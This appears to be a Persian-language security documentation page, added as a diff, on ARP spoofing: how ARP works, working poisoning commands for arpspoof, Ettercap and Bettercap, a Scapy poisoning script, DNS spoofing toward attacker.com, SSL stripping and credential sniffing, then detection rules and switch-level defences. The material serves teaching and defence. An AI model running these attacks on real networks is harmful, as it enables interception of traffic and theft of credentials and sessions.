@@ -1,0 +1,664 @@
+---
+title: حملات ARP
+description: جعل ARP، مسمومیت و حملات man-in-the-middle
+---
+
+## مروری بر پروتکل ARP
+
+**ARP (Address Resolution Protocol)** آدرس‌های IP را به آدرس‌های MAC در شبکه‌های محلی نگاشت می‌کند. در لایه 2 (پیوند داده) کار می‌کند و برای ارتباط Ethernet ضروری است.
+
+### نحوه کار ARP
+
+```
+میزبان A (192.168.1.10) می‌خواهد به میزبان B (192.168.1.20) ارسال کند
+1. میزبان A کش ARP را برای 192.168.1.20 بررسی می‌کند
+2. اگر پیدا نشد، درخواست ARP پخش می‌کند: "چه کسی 192.168.1.20 دارد؟"
+3. میزبان B با پاسخ ARP جواب می‌دهد: "192.168.1.20 در MAC AA:BB:CC:DD:EE:FF است"
+4. میزبان A نگاشت را در کش ذخیره می‌کند و فریم را به MAC میزبان B ارسال می‌کند
+```
+
+### انواع پیام ARP
+
+**درخواست ARP** (پخش)
+```
+IP فرستنده: 192.168.1.10
+MAC فرستنده: 00:11:22:33:44:55
+IP هدف: 192.168.1.20
+MAC هدف: 00:00:00:00:00:00 (ناشناخته)
+```
+
+**پاسخ ARP** (یونی‌کست)
+```
+IP فرستنده: 192.168.1.20
+MAC فرستنده: AA:BB:CC:DD:EE:FF
+IP هدف: 192.168.1.10
+MAC هدف: 00:11:22:33:44:55
+```
+
+### کش ARP
+
+مشاهده کش ARP:
+```bash
+# Linux
+arp -a
+ip neigh show
+
+# Windows
+arp -a
+
+# macOS
+arp -a
+```
+
+مثال خروجی:
+```
+? (192.168.1.1) at 00:11:22:33:44:55 [ether] on eth0
+? (192.168.1.20) at AA:BB:CC:DD:EE:FF [ether] on eth0
+```
+
+## آسیب‌پذیری‌های ARP
+
+### عدم احراز هویت
+- ARP هیچ مکانیزم امنیتی ندارد
+- هر میزبانی می‌تواند پاسخ‌های ARP ارسال کند
+- پاسخ‌های ARP ناخواسته پذیرفته می‌شوند
+- ورودی‌های کش می‌توانند بازنویسی شوند
+
+### ماهیت پخش
+- درخواست‌های ARP به همه میزبان‌ها پخش می‌شود
+- هر میزبانی می‌تواند پاسخ دهد
+- پاسخ‌های چندگانه ممکن است
+
+### پروتکل بدون وضعیت
+- بدون ردیابی نشست
+- بدون تایید پاسخ‌ها
+- ورودی‌های کش منقضی می‌شوند، می‌توانند مجدداً مسموم شوند
+
+## جعل/مسمومیت ARP
+
+**جعل ARP** (همچنین مسمومیت ARP نامیده می‌شود) شامل ارسال پیام‌های ARP جعلی برای ارتباط آدرس MAC مهاجم با آدرس IP میزبان دیگر، معمولاً gateway است.
+
+### سناریوی حمله
+
+```
+عادی:
+کلاینت (192.168.1.10) → Gateway (192.168.1.1، MAC: AA:AA:AA:AA:AA:AA)
+
+حمله:
+مهاجم پاسخ ARP جعلی به کلاینت ارسال می‌کند:
+"192.168.1.1 در BB:BB:BB:BB:BB:BB است" (MAC مهاجم)
+
+کلاینت کش ARP را به‌روز می‌کند:
+192.168.1.1 → BB:BB:BB:BB:BB:BB (مهاجم)
+
+همه ترافیک به gateway از طریق مهاجم می‌رود (MITM)
+```
+
+### مسمومیت دوطرفه
+
+برای رهگیری ترافیک در هر دو جهت:
+```
+1. مسموم کردن کلاینت: "IP Gateway در MAC مهاجم است"
+2. مسموم کردن Gateway: "IP کلاینت در MAC مهاجم است"
+3. فعال کردن فوروارد IP در دستگاه مهاجم
+4. همه ترافیک از طریق مهاجم جریان می‌یابد
+```
+
+## ابزارهای حمله ARP
+
+### arpspoof
+
+بخشی از مجموعه dsniff، ساده و موثر.
+
+#### نصب
+```bash
+# Debian/Ubuntu
+sudo apt install dsniff
+
+# macOS
+brew install dsniff
+```
+
+#### استفاده پایه
+```bash
+# مسموم کردن کش ARP قربانی
+sudo arpspoof -i eth0 -t <victim-ip> <gateway-ip>
+
+# مثال: به 192.168.1.10 بگو که gateway (192.168.1.1) در MAC مهاجم است
+sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+
+# دوطرفه (اجرا در دو ترمینال)
+# ترمینال 1: مسموم کردن قربانی
+sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+
+# ترمینال 2: مسموم کردن gateway
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
+
+# فعال کردن فوروارد IP (Linux)
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+# یا
+sudo sysctl -w net.ipv4.ip_forward=1
+```
+
+### Ettercap
+
+فریمورک MITM کامل با پشتیبانی افزونه.
+
+#### نصب
+```bash
+# Debian/Ubuntu
+sudo apt install ettercap-graphical ettercap-text-only
+
+# macOS
+brew install ettercap
+```
+
+#### حالت GUI
+```bash
+sudo ettercap -G
+
+# مراحل:
+# 1. Sniff → Unified sniffing → انتخاب رابط
+# 2. Hosts → Scan for hosts
+# 3. Hosts → Hosts list
+# 4. اضافه کردن gateway به Target 1
+# 5. اضافه کردن قربانی به Target 2
+# 6. MITM → ARP poisoning → Sniff remote connections
+# 7. Start → Start sniffing
+```
+
+#### حالت CLI
+```bash
+# رابط متنی
+sudo ettercap -T -M arp:remote -i eth0 /victim-ip// /gateway-ip//
+
+# مثال
+sudo ettercap -T -M arp:remote -i eth0 /192.168.1.10// /192.168.1.1//
+
+# در برابر کل زیرشبکه
+sudo ettercap -T -M arp:remote -i eth0 /192.168.1.0/24// /192.168.1.1//
+
+# با فیلتر (SSL stripping و غیره)
+sudo ettercap -T -M arp:remote -F filter.ef -i eth0 //
+
+# حالت ساکت (فقط لاگ)
+sudo ettercap -T -M arp:remote -i eth0 -q /victim// /gateway//
+```
+
+#### فیلترهای Ettercap
+```bash
+# ایجاد فایل فیلتر (مثال: dns-spoof.ecf)
+if (ip.proto == UDP && udp.dst == 53) {
+    if (search(DATA.data, "example.com")) {
+        replace("example.com", "attacker.com");
+        msg("DNS spoofed\n");
+    }
+}
+
+# کامپایل فیلتر
+etterfilter dns-spoof.ecf -o dns-spoof.ef
+
+# استفاده از فیلتر
+sudo ettercap -T -M arp:remote -F dns-spoof.ef -i eth0 //
+```
+
+### Bettercap
+
+فریمورک MITM مدرن و قدرتمند با اسکریپت‌نویسی.
+
+#### نصب
+```bash
+# Debian/Ubuntu
+sudo apt install bettercap
+
+# macOS
+brew install bettercap
+
+# از منبع
+go install github.com/bettercap/bettercap@latest
+```
+
+#### حالت تعاملی
+```bash
+sudo bettercap -iface eth0
+
+# دستورات در پوسته تعاملی:
+# کشف میزبان‌ها
+> net.probe on
+
+# نمایش میزبان‌ها
+> net.show
+
+# تنظیم اهداف
+> set arp.spoof.targets 192.168.1.10
+> set arp.spoof.fullduplex true
+
+# شروع جعل ARP
+> arp.spoof on
+
+# شنود اعتبارنامه‌ها
+> net.sniff on
+
+# ترافیک HTTP/HTTPS
+> set http.proxy.sslstrip true
+> http.proxy on
+> https.proxy on
+```
+
+#### اسکریپت‌نویسی (Caplets)
+```bash
+# ایجاد فایل caplet (mitm.cap)
+net.probe on
+set arp.spoof.targets 192.168.1.10
+set arp.spoof.fullduplex true
+arp.spoof on
+net.sniff on
+
+# اجرای caplet
+sudo bettercap -iface eth0 -caplet mitm.cap
+```
+
+### Cain & Abel (Windows)
+
+ابزار قدیمی برای Windows، هنوز موثر.
+
+```
+1. پیکربندی sniffer (آداپتور)
+2. شروع sniffer
+3. کلیک "+" برای اسکن میزبان‌ها
+4. رفتن به تب "APR" (ARP Poison Routing)
+5. کلیک "+" و انتخاب اهداف
+6. کلیک دکمه "Start/Stop APR"
+```
+
+## تکنیک‌های حمله
+
+### حمله ARP مهربانانه (Gratuitous)
+
+ارسال پاسخ‌های ARP ناخواسته برای مسموم کردن کش‌ها.
+
+```bash
+# استفاده از arping
+sudo arping -U -I eth0 -s 192.168.1.1 192.168.1.10
+# ارسال ARP مهربانانه با ادعای بودن gateway
+```
+
+### مسمومیت کش ARP از طریق Scapy
+
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+import time
+
+victim_ip = "192.168.1.10"
+victim_mac = "00:11:22:33:44:55"
+gateway_ip = "192.168.1.1"
+gateway_mac = "AA:AA:AA:AA:AA:AA"
+attacker_mac = "BB:BB:BB:BB:BB:BB"
+
+def poison(target_ip, target_mac, spoof_ip):
+    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
+    send(arp, verbose=False)
+
+try:
+    while True:
+        poison(victim_ip, victim_mac, gateway_ip)
+        poison(gateway_ip, gateway_mac, victim_ip)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nبازیابی جداول ARP...")
+    # ارسال ARP صحیح برای بازیابی
+    restore = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    send(restore, count=5, verbose=False)
+```
+
+### جریان حمله Man-in-the-Middle
+
+```
+1. فعال کردن فوروارد IP
+2. شروع مسمومیت ARP (قربانی و gateway)
+3. ضبط ترافیک با tcpdump/Wireshark
+4. به صورت اختیاری دستکاری ترافیک
+5. ثبت اعتبارنامه‌ها، توکن‌های نشست و غیره
+```
+
+مثال کامل:
+```bash
+# ترمینال 1: فعال کردن فوروارد
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# ترمینال 2: مسمومیت ARP قربانی
+sudo arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1
+
+# ترمینال 3: ضبط ترافیک
+sudo tcpdump -i eth0 -w mitm.pcap -s 0
+
+# یا استفاده از Wireshark GUI
+sudo wireshark -i eth0 -k
+```
+
+## روش‌های تشخیص
+
+### تشخیص مبتنی بر شبکه
+
+#### تشخیص با arpwatch
+
+```bash
+# نصب
+sudo apt install arpwatch
+
+# شروع نظارت
+sudo arpwatch -i eth0
+
+# بررسی لاگ‌ها
+sudo tail -f /var/log/syslog | grep arpwatch
+
+# مثال هشدار:
+# changed ethernet address 192.168.1.1 from 0:11:22:33:44:55 to bb:bb:bb:bb:bb:bb
+```
+
+#### تشخیص با arpalert
+
+```bash
+# نصب
+sudo apt install arpalert
+
+# پیکربندی (/etc/arpalert/arpalert.conf)
+interface = eth0
+maclist file = /etc/arpalert/maclist.allow
+
+# اضافه کردن MACهای قانونی به لیست سفید
+echo "192.168.1.1 00:11:22:33:44:55" | sudo tee -a /etc/arpalert/maclist.allow
+
+# شروع
+sudo arpalert
+```
+
+#### نظارت با tcpdump
+
+```bash
+# ضبط ترافیک ARP
+sudo tcpdump -i eth0 arp -e -n
+
+# به دنبال:
+# - IPهای تکراری با MACهای مختلف
+# - پاسخ‌های ARP مفرط
+# - پاسخ‌های ARP ناخواسته
+```
+
+#### تشخیص Wireshark
+
+```
+# فیلتر نمایش
+arp
+
+# به دنبال:
+# - پاسخ‌های ARP بدون درخواست
+# - IP یکسان با MACهای مختلف
+# - نرخ بالای بسته‌های ARP
+
+# فیلتر IPهای تکراری
+arp.duplicate-address-detected
+
+# فیلتر ARP مهربانانه
+arp.opcode == 2 && arp.src.proto_ipv4 == arp.dst.proto_ipv4
+```
+
+### تشخیص مبتنی بر میزبان
+
+#### بازرسی دستی کش ARP
+
+```bash
+# Linux
+arp -a
+ip neigh show
+
+# به دنبال IPهای تکراری یا MACهای غیرمنتظره
+# مقایسه با مقادیر خوب شناخته شده
+```
+
+#### ورودی‌های ARP ثابت
+
+```bash
+# اضافه کردن ورودی ثابت (جلوگیری از مسمومیت)
+# Linux
+sudo arp -s 192.168.1.1 00:11:22:33:44:55
+
+# Windows
+arp -s 192.168.1.1 00-11-22-33-44-55
+
+# مشاهده ورودی‌های ثابت
+arp -a | grep CM  # Linux (CM = کامل، دائمی)
+```
+
+#### اسکریپت تشخیص خودکار
+
+```bash
+#!/bin/bash
+# arp-monitor.sh
+
+GATEWAY_IP="192.168.1.1"
+GATEWAY_MAC="00:11:22:33:44:55"
+
+while true; do
+    CURRENT_MAC=$(arp -n $GATEWAY_IP | awk '/ether/ {print $3}')
+    if [ "$CURRENT_MAC" != "$GATEWAY_MAC" ]; then
+        echo "[هشدار] مسمومیت ARP تشخیص داده شد!"
+        echo "MAC مورد انتظار: $GATEWAY_MAC"
+        echo "MAC فعلی: $CURRENT_MAC"
+        # ارسال ایمیل هشدار یا اطلاع‌رسانی
+    fi
+    sleep 5
+done
+```
+
+### تشخیص IDS/IPS
+
+#### قوانین Snort
+
+```snort
+# تشخیص جعل ARP
+alert arp any any -> any any (msg:"ARP Spoofing Detected"; \
+  arp_opcode:2; \
+  threshold:type both, track by_src, count 5, seconds 60; \
+  sid:1000020;)
+
+# تشخیص ARP مهربانانه
+alert arp any any -> any any (msg:"Gratuitous ARP"; \
+  arp_opcode:2; \
+  content:"|00 00 00 00 00 00|"; offset:18; depth:6; \
+  sid:1000021;)
+```
+
+#### قوانین Suricata
+
+```yaml
+alert arp any any -> any any (msg:"Possible ARP Spoofing"; \
+  arp.opcode:2; \
+  threshold:type threshold, track by_src, count 10, seconds 60; \
+  classtype:network-scan; sid:2000020;)
+```
+
+## پیشگیری و کاهش
+
+### بازرسی پویای ARP (DAI)
+
+DAI بسته‌های ARP را در برابر پایگاه داده binding DHCP snooping اعتبارسنجی می‌کند.
+
+```cisco
+# پیش‌نیازها: DHCP snooping فعال
+ip dhcp snooping
+ip dhcp snooping vlan 10
+
+# فعال کردن DAI
+ip arp inspection vlan 10
+
+# اعتماد به پورت‌های uplink (به روترها/سرورها)
+interface GigabitEthernet0/1
+  ip arp inspection trust
+
+# محدودسازی نرخ (جلوگیری از DoS)
+interface range FastEthernet0/1-24
+  ip arp inspection limit rate 15 burst interval 1
+
+# اعتبارسنجی MAC مبدأ
+ip arp inspection validate src-mac
+
+# اعتبارسنجی MAC مقصد
+ip arp inspection validate dst-mac
+
+# اعتبارسنجی آدرس‌های IP
+ip arp inspection validate ip
+
+# همه اعتبارسنجی‌ها
+ip arp inspection validate src-mac dst-mac ip
+
+# تایید پیکربندی
+show ip arp inspection
+show ip arp inspection statistics
+```
+
+### ورودی‌های ARP ثابت
+
+```bash
+# سرورها/gatewayهای بحرانی
+sudo arp -s 192.168.1.1 00:11:22:33:44:55
+sudo arp -s 192.168.1.10 AA:BB:CC:DD:EE:FF
+
+# پایداری در راه‌اندازی‌های مجدد (Linux)
+echo "192.168.1.1 00:11:22:33:44:55" | sudo tee -a /etc/ethers
+```
+
+### امنیت پورت
+
+```cisco
+interface FastEthernet0/5
+  switchport port-security
+  switchport port-security maximum 1
+  switchport port-security violation shutdown
+  switchport port-security mac-address sticky
+```
+
+### VLANهای خصوصی
+
+جداسازی میزبان‌ها برای جلوگیری از حملات جانبی.
+
+```cisco
+vlan 100
+  private-vlan primary
+vlan 101
+  private-vlan isolated
+```
+
+### رمزگذاری
+
+استفاده از پروتکل‌های رمزگذاری شده برای کاهش تاثیر:
+- HTTPS به جای HTTP
+- SSH به جای Telnet
+- VPN برای دسترسی از راه دور
+- TLS برای ایمیل (SMTPS، IMAPS)
+
+### بخش‌بندی شبکه
+
+- VLANهای جداگانه برای بخش‌ها
+- DMZ برای سرویس‌های عمومی
+- VLAN مدیریت برای زیرساخت
+- جداسازی شبکه مهمان
+
+## بازیابی از حمله
+
+### مراحل فوری
+
+1. **شناسایی میزبان‌های مسموم شده**
+   ```bash
+   # بررسی MACهای تکراری
+   arp -a
+   ```
+
+2. **پاک کردن کش ARP**
+   ```bash
+   # Linux
+   sudo ip -s -s neigh flush all
+   
+   # Windows
+   arp -d *
+   
+   # macOS
+   sudo arp -a -d
+   ```
+
+3. **مکان‌یابی مهاجم**
+   ```cisco
+   show ip arp inspection
+   show mac address-table | include <attacker-mac>
+   ```
+
+4. **خاموش کردن پورت مخرب**
+   ```cisco
+   interface FastEthernet0/12
+     shutdown
+   ```
+
+5. **فعال کردن DAI** اگر هنوز فعال نیست
+
+### اصلاح بلندمدت
+
+1. فعال کردن DAI در همه VLANها
+2. پیاده‌سازی DHCP snooping
+3. استقرار IDS/IPS با تشخیص ARP
+4. استفاده از ARP ثابت برای سیستم‌های بحرانی
+5. ممیزی‌های امنیتی منظم
+6. کنترل دسترسی شبکه (802.1X)
+7. آموزش آگاهی امنیتی کاربر
+
+## بهترین روش‌ها
+
+1. **فعال کردن DAI** در همه سوئیچ‌های دسترسی
+2. **پیاده‌سازی DHCP snooping** به عنوان پیش‌نیاز
+3. **ورودی‌های ARP ثابت** برای سرورها و gatewayها
+4. **نظارت بر ترافیک ARP** با arpwatch یا مشابه
+5. **استفاده از پروتکل‌های رمزگذاری شده** برای کاهش تاثیر
+6. **بخش‌بندی شبکه** با VLANها
+7. **امنیت پورت** برای محدود کردن آدرس‌های MAC
+8. **ممیزی‌های منظم** جداول ARP
+9. **استقرار IDS/IPS** با قوانین ARP
+10. **آموزش کاربران** درباره خطرات MITM
+
+## سناریوهای حمله پیشرفته
+
+### جعل ARP + جعل DNS
+```bash
+# مسموم کردن ARP
+sudo ettercap -T -M arp:remote //victim// //gateway//
+
+# جعل DNS
+# استفاده از dnsspoof یا تغییر /etc/hosts
+echo "192.168.1.100 google.com" | sudo tee -a /etc/hosts
+
+# یا با Bettercap
+set dns.spoof.domains google.com
+set dns.spoof.address 192.168.1.100
+dns.spoof on
+```
+
+### SSL Stripping
+```bash
+# استفاده از sslstrip (منسوخ شده)
+sudo sslstrip -l 8080
+
+# استفاده از Bettercap
+set http.proxy.sslstrip true
+http.proxy on
+```
+
+### ربودن نشست
+بعد از MITM، ضبط کوکی‌های نشست و پخش مجدد آنها.
+
+## منابع
+
+- RFC 826: Address Resolution Protocol
+- Ettercap: https://www.ettercap-project.org
+- Bettercap: https://www.bettercap.org
+- مستندات ابزار arpwatch
+- راهنمای پیکربندی Cisco DAI
+- استراتژی‌های کاهش حمله MITM
